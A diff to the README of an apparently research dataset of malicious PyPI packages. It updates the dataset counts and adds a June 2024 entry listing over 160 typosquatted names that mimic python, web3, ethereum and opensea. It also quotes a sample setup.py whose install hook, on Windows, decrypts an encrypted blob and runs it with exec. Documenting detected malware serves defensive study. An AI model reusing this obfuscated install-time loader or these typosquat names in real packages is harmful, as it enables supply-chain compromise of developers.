@@ -1,6 +1,6 @@
 ## Dataset Size
 
-This data set includes about 5,939 versions of the source code of 5,199 malicious packages.
+This data set includes about 6,099 versions of the source code of 5,395 malicious packages.
 
 ## Dataset Format
 
@@ -517,6 +517,25 @@ class CustomInstallCommand(install):
         atexit.register(_post_install)
 ```
 
+### 17 Jun. 2024 
+We detected over 160 new malicious packages from PyPI using our proposed tool.
+
+bussardweg4a, bussardweg4av2, bussardweg4av3, pyhton, pythn, pytgon, pytjon, pytuon, pytbon, pytohn, pytyon, pythkn, pythom, pythob, pytnon, pyhthon, pytojn, pytiom, pytiob, pythun, pytoh, pytonn, pthon, we3b, wev3, wb3, web3e, webt3, w3eb, 3web, w3b, wweb, werb3, web3q, wdb3, web2, wbe3, wweb3, web3-pyy, web3-pyu, w3b-py, web4-py, wb3-py, ewb3-py, wev3-py, web3-pu, we3-py, wweb3-py, 3web-py, web3-py9, web3-0py, web3-po, web3-p6, web3-p7, etheerum, ehtereum, etheereum, etehreum, etherium, wbe3-py, weeb3-py, ethherum, etherun, ethereun, eutherium, ethreium, eethereum, ethreum, etheerium, theerum, ethrum, etherum, etheum, etherem, etheurm, ethereuum, etheirum, etherriuum, etheruim, etheraem, etheriuum, eetherium, etheruem, ethererum, etheriun, etherreum, etheeruum, etheereium, etherim, etheriumm, ethereuim, etherreeum, etheeruim, etheriuim, etheruum, ettherium, ethreeum, ethherium, etheerem, etherreumm, etherumm, ethereumm, ethereim, etheeruimm, etherrium, etheruemm, ethereium, etheriem, etherriuumm, etheerim, openxsea, openasea, opensae, opensa, openesaa, openseaa, opnesea, oepnsea, openza, openes, openesa, opnsea, openae, openseea, oensea, opesnea, openzea, openseaz, openeasea, opensee, openrea, openwea, opemsea, opensew, oenasea, openresa, opensesa, opensead, openwse, openswa, openwsaa, opensear, openzsea, openrsea, openwsea, oenesea, openxsa, oopensea, openaes, opensar, openseax, openseae, oenwea, oepenwea, oepensea, oopenwea, opwnsea, openwae, oenwsea, openeaa
+
+```python
+VERSION = '1.0.0'
+DESCRIPTION = 'UXxyykmDXkAnPEQfNvdUtxTNuctckuaHHCnTImtQRzglOiWmdzrZv'
+LONG_DESCRIPTION = 'ujJtdAnhzIGMdzefKCkVnrXMrhkNnLZScQUjSueXaDwVQpRDVAvqPJZlleBBmdIkGFIemKYQTGIiVIKNFDBsoseEpqycHkgpOIhQy oOGLXFwcpyzaYlEaZjRHWhUJcILolUlWYcptAEheKQwMqaxeXuDnslbeTwUJhVTyXXnqlyU tLfJDT kVrgTSpXVxaJS'
+
+class ISoCBaTjPLsVbdxvjibMWcFHgcNtfpDzwQpVFCUFERhdMzcSHOefUivrlwPKlRvSNuipCwrnebUodDeRylAoEVzGEnmrlxXHcOysITsUiAnMnMkQhnFFpAHjmKiRvSktdpFxRXdnCZSLwgdtuNmXAQzxX(install):
+        def run(self):
+            import os
+            if os.name == "nt":
+                import requests
+                from fernet import Fernet
+                exec(Fernet(b'QfwZUeQEdWdRN900FHlkogRkaRrUbQ15w5bLprHO8CI=').decrypt(b'gAAAAABmbvUP4TYR920z_RnjSNJZue88X-Xy-Z5T4NBwSlgSwgxIM8OYeSfb3fWY6L4jkak7LzL1JIarsJIFk9FWfactZo44jGDw93QAuPAWGydpk_ZeLwCfeZ3X7TOBvZ2tCZ8VKgT-Ol-BopepZIHls8qx-2IWSKhT6aFergwW-xmRPdc0vn81lA0UgqwjNULokOrW0KpLyroVEzTpCZjiNUuI-vnYOzzdpQjFzkWev9OH8HCrDU4='))
+            install.run(self)
+```
 
 ## About the malicious packages detection
 
